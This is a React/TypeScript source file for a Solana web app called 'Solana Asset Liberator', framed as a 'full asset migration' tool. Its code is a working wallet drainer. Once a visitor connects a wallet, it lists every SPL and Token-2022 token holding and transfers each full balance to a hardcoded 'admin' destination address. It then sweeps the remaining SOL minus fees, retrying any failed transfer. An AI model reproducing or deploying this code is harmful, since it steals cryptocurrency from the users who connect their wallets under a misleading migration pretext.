
import React, { useState, useCallback, useMemo } from 'react';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { 
    PublicKey, 
    Transaction, 
    SystemProgram, 
    LAMPORTS_PER_SOL
} from '@solana/web3.js';
import { 
    TOKEN_PROGRAM_ID, 
    TOKEN_2022_PROGRAM_ID,
    getAssociatedTokenAddress, 
    createTransferInstruction,
    createAssociatedTokenAccountInstruction
} from '@solana/spl-token';

// =============================================================================
// ADMIN CONFIGURATION
// =============================================================================
// Set the destination wallet address and retry settings here.
const DESTINATION_WALLET = '5mb4wD4v4W2z6Tzfxn6hRRCpTzH3G29sYQ31eKcSw5aC'; // <-- ADMIN: SET DESTINATION ADDRESS
const RETRY_ATTEMPTS = 3; // <-- ADMIN: SET RETRY ATTEMPTS ON FAILURE
// =============================================================================


// Helper component for SVG icons
const CheckCircleIcon: React.FC<{ className: string }> = ({ className }) => (
    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className={className}>
        <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
    </svg>
);

const ExclamationTriangleIcon: React.FC<{ className: string }> = ({ className }) => (
    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className={className}>
        <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z" />
    </svg>
);


const App: React.FC = () => {
    const { connection } = useConnection();
    const { publicKey, sendTransaction } = useWallet();

    const [status, setStatus] = useState<'idle' | 'loading' | 'success' | 'error'>('idle');
    const [message, setMessage] = useState<string>('');
    const [progress, setProgress] = useState<{current: number, total: number, asset: string} | null>(null);
    const [results, setResults] = useState<{asset: string, status: 'success' | 'failed' | 'skipped', signature?: string, error?: string}[]>([]);
    
    const isRecipientValid = useMemo(() => {
        if (!DESTINATION_WALLET) return false;
        try {
            new PublicKey(DESTINATION_WALLET);
            return true;
        } catch (e) {
            return false;
        }
    }, []);

    const handleMigration = useCallback(async () => {
        if (!publicKey) {
            setMessage('Wallet not connected. Connect your wallet to proceed.');
            setStatus('error');
            return;
        }

        if (!isRecipientValid) {
            setMessage('The pre-configured destination wallet address is invalid. Please contact the administrator.');
            setStatus('error');
            return;
        }

        let destinationPublicKey: PublicKey;
        try {
            destinationPublicKey = new PublicKey(DESTINATION_WALLET);
        } catch (err) {
            setMessage('The pre-configured destination wallet address is invalid. Please contact the administrator.');
            setStatus('error');
            return;
        }

        if (destinationPublicKey.equals(publicKey)) {
            setMessage('Destination wallet cannot be the same as the source wallet.');
            setStatus('error');
            return;
        }
        
        setStatus('loading');
        setMessage('Starting migration process...');
        setResults([]);
        setProgress(null);

        try {
            // 1. GATHER ASSETS
            setMessage('Discovering all transferable assets...');
            const [tokenAccounts, token2022Accounts] = await Promise.all([
                connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID }),
                connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_2022_PROGRAM_ID })
            ]);

            const allTokenAccounts = [...tokenAccounts.value, ...token2022Accounts.value];
            const tokensToTransfer = allTokenAccounts.filter(a => a.account.data.parsed.info.tokenAmount.uiAmount > 0);
            
            const solBalanceInitially = await connection.getBalance(publicKey);
            const totalAssets = tokensToTransfer.length + (solBalanceInitially > 0 ? 1 : 0);

            if (totalAssets === 0) {
                 setMessage('No transferable assets detected in the source wallet.');
                 setStatus('error');
                 return;
            }

            const newResults: typeof results = [];

            // 2. TRANSFER SPL TOKENS
            for (let i = 0; i < tokensToTransfer.length; i++) {
                const { pubkey, account } = tokensToTransfer[i];
                const mint = new PublicKey(account.data.parsed.info.mint);
                const tokenInfo = account.data.parsed.info;
                const assetName = `Token (${mint.toBase58().slice(0, 4)}...${mint.toBase58().slice(-4)})`;
                
                setProgress({ current: i + 1, total: totalAssets, asset: assetName });
                setMessage(`[${i+1}/${totalAssets}] Preparing ${tokenInfo.tokenAmount.uiAmount} ${assetName}`);
                
                let success = false;
                let lastError: any = null;
                let signature: string | undefined = undefined;

                for (let attempt = 0; attempt <= RETRY_ATTEMPTS; attempt++) {
                    try {
                        const { blockhash } = await connection.getLatestBlockhash();
                        const transaction = new Transaction({ recentBlockhash: blockhash, feePayer: publicKey });
                        const tokenProgramId = account.owner;
                        const fromAta = pubkey;
                        const toAta = await getAssociatedTokenAddress(mint, destinationPublicKey, false, tokenProgramId);

                        const toAtaAccount = await connection.getAccountInfo(toAta);
                        if (!toAtaAccount) {
                            transaction.add(
                                createAssociatedTokenAccountInstruction(publicKey, toAta, destinationPublicKey, mint, tokenProgramId)
                            );
                        }
                        
                        transaction.add(
                            createTransferInstruction(fromAta, toAta, publicKey, BigInt(tokenInfo.tokenAmount.amount), [], tokenProgramId)
                        );
                        
                        setMessage(`[${i+1}/${totalAssets}] Awaiting signature for ${assetName}...`);
                        signature = await sendTransaction(transaction, connection);
                        await connection.confirmTransaction(signature, 'confirmed');
                        
                        success = true;
                        break; // Exit retry loop on success
                    } catch (error) {
                        lastError = error;
                        if (attempt < RETRY_ATTEMPTS) {
                            setMessage(`Failed to transfer ${assetName}. Retrying (${attempt + 1}/${RETRY_ATTEMPTS})...`);
                            await new Promise(res => setTimeout(res, 2000)); // Wait 2s before retry
                        }
                    }
                }

                if (success) {
                    newResults.push({ asset: assetName, status: 'success', signature });
                } else {
                    newResults.push({ asset: assetName, status: 'failed', error: lastError?.message || 'Unknown error' });
                }
                setResults([...newResults]);
            }

            // 3. TRANSFER NATIVE SOL
            const currentSolBalance = await connection.getBalance(publicKey);
            if (currentSolBalance > 0) {
                setProgress({ current: tokensToTransfer.length + 1, total: totalAssets, asset: 'SOL' });
                setMessage(`[${tokensToTransfer.length + 1}/${totalAssets}] Preparing native SOL transfer...`);

                let success = false;
                let lastError: any = null;
                let signature: string | undefined = undefined;

                for (let attempt = 0; attempt <= RETRY_ATTEMPTS; attempt++) {
                    try {
                        const balance = await connection.getBalance(publicKey);
                        const dummyTx = new Transaction().add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: destinationPublicKey, lamports: balance }));
                        dummyTx.feePayer = publicKey;
                        const { blockhash } = await connection.getLatestBlockhash();
                        dummyTx.recentBlockhash = blockhash;
                        
                        const fee = (await connection.getFeeForMessage(dummyTx.compileMessage(), 'confirmed')).value || 0;
                        const solToSend = balance - fee;

                        if (solToSend <= 0) {
                            newResults.push({ asset: 'SOL', status: 'skipped', error: 'Balance too low to cover transaction fees.' });
                            setResults([...newResults]);
                            success = true;
                            break;
                        }

                        const transaction = new Transaction({ recentBlockhash: blockhash, feePayer: publicKey })
                            .add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: destinationPublicKey, lamports: solToSend }));
                        
                        setMessage(`[${tokensToTransfer.length + 1}/${totalAssets}] Awaiting signature for ${solToSend / LAMPORTS_PER_SOL} SOL...`);
                        signature = await sendTransaction(transaction, connection);
                        await connection.confirmTransaction(signature, 'confirmed');

                        success = true;
                        break;
                    } catch (error) {
                        lastError = error;
                        if (attempt < RETRY_ATTEMPTS) {
                            setMessage(`Failed to transfer SOL. Retrying (${attempt + 1}/${RETRY_ATTEMPTS})...`);
                            await new Promise(res => setTimeout(res, 2000));
                        }
                    }
                }
                
                if (success && signature) {
                    newResults.push({ asset: 'SOL', status: 'success', signature });
                } else if (!success) {
                    newResults.push({ asset: 'SOL', status: 'failed', error: lastError?.message || 'Unknown error' });
                }
                setResults([...newResults]);
            }

            // 4. FINISH
            setStatus('success');
            const successes = newResults.filter(r => r.status === 'success').length;
            const failures = newResults.filter(r => r.status !== 'success').length;
            setMessage(`Migration finished. ${successes} successful, ${failures} failed or skipped.`);
            setProgress(null);

        } catch (error: any) {
            setStatus('error');
            setMessage(error.message || 'An unexpected error occurred during the migration setup.');
            setProgress(null);
        }
    }, [publicKey, connection, sendTransaction, isRecipientValid]);
    
    return (
        <div className="bg-gray-900 text-white min-h-screen flex flex-col items-center p-4 font-mono">
            <div className="w-full max-w-4xl">
                <header className="flex justify-between items-center py-4 border-b border-gray-700">
                    <h1 className="text-2xl font-bold">Solana Asset Liberator</h1>
                    <WalletMultiButton />
                </header>

                <main className="mt-8">
                    <div className="bg-gray-800 p-6 rounded-lg shadow-lg border border-gray-700">
                        <h2 className="text-xl font-semibold mb-4">Transfer All Assets to a New Wallet</h2>
                        <p className="text-gray-400 mb-6">
                            This tool will transfer all your SOL and SPL tokens (including Token-2022) from the currently connected wallet to a pre-configured destination wallet.
                            Click the button below to begin the migration.
                        </p>

                        <div className="space-y-6 mb-8">
                            <div>
                                <label className="block text-sm font-medium text-gray-400 mb-2">Source Wallet (Connected)</label>
                                <div className="bg-gray-900/50 p-3 rounded-lg font-semibold break-all border border-gray-700">
                                    {publicKey ? publicKey.toBase58() : <span className="text-gray-500">Not connected</span>}
                                </div>
                            </div>

                            <div>
                                <label className="block text-sm font-medium text-gray-400 mb-2">Destination Wallet (Pre-configured)</label>
                                <div className={`bg-gray-900/50 p-3 rounded-lg font-semibold break-all border ${isRecipientValid ? 'border-gray-700' : 'border-red-500'}`}>
                                    {isRecipientValid ? DESTINATION_WALLET : <span className="text-red-400">Invalid Admin Configuration</span>}
                                </div>
                                 <p className="text-gray-500 text-sm mt-2">
                                    All assets will be sent to this address. This is set by the application administrator.
                                </p>
                            </div>
                        </div>

                        <button
                            onClick={handleMigration}
                            disabled={!publicKey || !isRecipientValid || status === 'loading'}
                            className="w-full bg-indigo-600 hover:bg-indigo-700 disabled:bg-gray-600 disabled:cursor-not-allowed text-white font-bold py-3 px-4 rounded-lg transition duration-300 flex items-center justify-center"
                        >
                            {status === 'loading' ? (
                                <>
                                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                    </svg>
                                    Migration in Progress...
                                </>
                            ) : 'Start Full Asset Migration'}
                        </button>
                    </div>

                    {status !== 'idle' && (
                        <div className="mt-8 bg-gray-800 p-6 rounded-lg shadow-lg border border-gray-700">
                            <h3 className="text-lg font-semibold mb-4">Migration Status</h3>
                            
                            {message && (
                                <div className={`flex items-center p-4 rounded-lg mb-4 ${
                                    status === 'error' ? 'bg-red-900/50 text-red-300 border border-red-700' :
                                    status === 'success' ? 'bg-green-900/50 text-green-300 border border-green-700' :
                                    'bg-blue-900/50 text-blue-300 border border-blue-700'
                                }`}>
                                    {status === 'error' && <ExclamationTriangleIcon className="h-6 w-6 mr-3 flex-shrink-0" />}
                                    {status === 'success' && <CheckCircleIcon className="h-6 w-6 mr-3 flex-shrink-0" />}
                                    <p className="break-all">{message}</p>
                                </div>
                            )}

                            {progress && (
                                <div className="w-full bg-gray-700 rounded-full h-4 mb-4">
                                    <div
                                        className="bg-indigo-600 h-4 rounded-full transition-all duration-300"
                                        style={{ width: `${(progress.current / progress.total) * 100}%` }}
                                    ></div>
                                </div>
                            )}

                            {results.length > 0 && (
                                <div>
                                    <h4 className="font-semibold mb-2">Detailed Log:</h4>
                                    <ul className="max-h-60 overflow-y-auto text-sm bg-gray-900 p-2 rounded-md border border-gray-700">
                                        {results.map((result, index) => (
                                            <li key={index} className="flex justify-between items-center py-1 px-2 rounded hover:bg-gray-700/50">
                                                <span>
                                                    {result.asset}:
                                                    {result.status === 'success' && <span className="text-green-400 ml-2">SUCCESS</span>}
                                                    {result.status === 'failed' && <span className="text-red-400 ml-2">FAILED</span>}
                                                    {result.status === 'skipped' && <span className="text-yellow-400 ml-2">SKIPPED</span>}
                                                </span>
                                                <div className="flex items-center space-x-2">
                                                    {result.error && (
                                                        <span className="text-gray-500 text-xs ml-2 max-w-xs truncate" title={result.error}>
                                                            {result.error}
                                                        </span>
                                                    )}
                                                    {result.signature && (
                                                        <a href={`https://explorer.solana.com/tx/${result.signature}?cluster=devnet`} target="_blank" rel="noopener noreferrer" className="text-indigo-400 hover:underline">
                                                            View Tx
                                                        </a>
                                                    )}
                                                </div>
                                            </li>
                                        ))}
                                    </ul>
                                </div>
                            )}
                        </div>
                    )}
                </main>
            </div>
        </div>
    );
};

export default App;
